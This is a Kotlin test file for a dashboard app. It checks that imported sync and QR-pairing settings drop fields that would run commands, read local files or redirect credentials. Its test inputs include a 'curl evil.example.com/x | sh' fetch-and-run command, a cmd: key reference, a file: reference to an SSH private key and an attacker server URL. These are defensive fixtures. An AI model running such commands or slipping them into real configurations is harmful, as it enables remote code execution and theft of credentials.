package com.angussoftware.fueldashboard.presentation

import com.angussoftware.fueldashboard.model.AgentSettings
import com.angussoftware.fueldashboard.model.MultiProviderSettings
import com.angussoftware.fueldashboard.model.ProviderConfig
import com.angussoftware.fueldashboard.model.ProviderKind
import com.angussoftware.fueldashboard.model.SettingsSyncData
import com.angussoftware.fueldashboard.settings.FuelSettingsStore
import kotlin.test.AfterTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNotEquals

/**
 * Importing settings must not be a way to make this machine run code.
 *
 * `POST /sync` and the QR pairing flow both hand over whole [ProviderConfig]
 * objects from another device. Two fields on that object are instructions to
 * this machine rather than data about a provider:
 *
 *  - `activateCommand` is executed when quota drops.
 *  - an `apiKey` holding a `cmd:` reference is executed to fetch the key, and
 *    a `file:` reference reads a local path of the sender's choosing and sends
 *    its contents to a provider.
 *
 * Honouring either would turn "scan this QR code" into arbitrary code
 * execution or exfiltration. Both are dropped at the boundary. This exercises
 * the real import path — the same one the HTTP endpoint calls.
 */
class ImportStripsUntrustedFieldsTest {

    @AfterTest
    fun clearStoredProviders() {
        FuelSettingsStore.saveMultiProvider(MultiProviderSettings())
    }

    private fun importPayload(vararg providers: ProviderConfig) {
        FuelSettingsStore.saveMultiProvider(MultiProviderSettings())
        val viewModel = FuelViewModel()
        try {
            viewModel.importSyncedSettings(
                SettingsSyncData(
                    scope = SettingsSyncData.SCOPE_SETTINGS,
                    providers = providers.toList(),
                    agentSettings = AgentSettings(),
                ),
            )
        } finally {
            viewModel.close()
        }
    }

    private fun stored(): List<ProviderConfig> = FuelSettingsStore.loadMultiProvider().providers

    @Test
    fun aSwitchCommandIsNeverAccepted() {
        importPayload(
            ProviderConfig(
                id = "zai-1",
                kind = ProviderKind.ZAI,
                apiKey = "legit-key",
                activateCommand = "curl evil.example.com/x | sh",
                swapAwayBelowPct = 99,
            ),
        )

        val p = stored().single { it.id == "zai-1" }
        assertEquals("", p.activateCommand, "an imported switch command would be executed by this machine")
        assertEquals(0, p.swapAwayBelowPct)
        // The rest of the provider must survive — this strips fields, not configs.
        assertEquals("legit-key", p.apiKey)
        assertEquals(ProviderKind.ZAI, p.kind)
    }

    @Test
    fun aCommandCredentialReferenceIsNeverAccepted() {
        importPayload(
            ProviderConfig(
                id = "zai-1",
                kind = ProviderKind.ZAI,
                apiKey = "cmd:curl evil.example.com/x",
            ),
        )

        val p = stored().single { it.id == "zai-1" }
        assertEquals("", p.apiKey, "a cmd: reference would be run by this machine to fetch a key")
        assertNotEquals("cmd:curl evil.example.com/x", p.apiKey)
    }

    @Test
    fun aFileCredentialReferenceIsNeverAccepted() {
        // Exfiltration rather than execution: the sender picks a local path and
        // its contents get sent to a provider as a credential.
        importPayload(
            ProviderConfig(id = "zai-1", kind = ProviderKind.ZAI, apiKey = "file:/home/user/.ssh/id_ed25519"),
        )
        assertEquals("", stored().single { it.id == "zai-1" }.apiKey)
    }

    @Test
    fun aLiteralKeyStillSyncsBecausePairingDependsOnIt() {
        // The phone needs real keys to poll, so literals must keep working —
        // only the fields that are instructions get dropped.
        importPayload(
            ProviderConfig(id = "zai-1", kind = ProviderKind.ZAI, apiKey = "sk-real-key-value"),
        )
        assertEquals("sk-real-key-value", stored().single { it.id == "zai-1" }.apiKey)
    }

    @Test
    fun aClaudeCodeServerUrlIsNeverAccepted() {
        // CLAUDE_CODE authenticates with the machine-local Claude Code OAuth
        // token — an imported serverUrl would aim that credential at a host
        // of the sender's choosing.
        importPayload(
            ProviderConfig(
                id = "cc-1",
                kind = ProviderKind.CLAUDE_CODE,
                serverUrl = "https://evil.example",
            ),
        )
        assertEquals("", stored().single { it.id == "cc-1" }.serverUrl)
    }

    @Test
    fun otherKindsKeepTheirServerUrl() {
        // Custom endpoints are a legitimate feature for key-bearing kinds —
        // the strip must not widen beyond CLAUDE_CODE.
        importPayload(
            ProviderConfig(
                id = "or-1",
                kind = ProviderKind.OPENROUTER,
                apiKey = "sk-x",
                serverUrl = "https://proxy.internal:8443/v1",
            ),
        )
        assertEquals("https://proxy.internal:8443/v1", stored().single { it.id == "or-1" }.serverUrl)
    }

    @Test
    fun theSanitizedProviderMatchesAnExplicitlySafeConfig() {
        // Allow-list, not deny-list: the imported result must equal a config
        // built ONLY from fields that are known-safe to accept. A future
        // ProviderConfig field that survives the sanitizer unhandled will
        // break this equality and fail the test here, at the boundary.
        importPayload(
            ProviderConfig(
                id = "zai-9",
                kind = ProviderKind.ZAI,
                apiKey = "cmd:evil",
                serverUrl = "https://evil.example",
                displayName = "Synced ZAI",
                monthlyBudgetUsd = 5.0,
                activateCommand = "evil-cmd",
                swapAwayBelowPct = 77,
                dormant = false,
            ),
        )
        val expected = ProviderConfig(
            id = "zai-9",
            kind = ProviderKind.ZAI,
            // sanitized fields
            apiKey = "", // cmd: reference stripped
            activateCommand = "",
            swapAwayBelowPct = 0,
            // safe fields pass through with their payload values
            serverUrl = "https://evil.example", // non-CLAUDE_CODE kinds keep it
            displayName = "Synced ZAI",
            monthlyBudgetUsd = 5.0,
        )
        assertEquals(expected, stored().single { it.id == "zai-9" })
    }
}
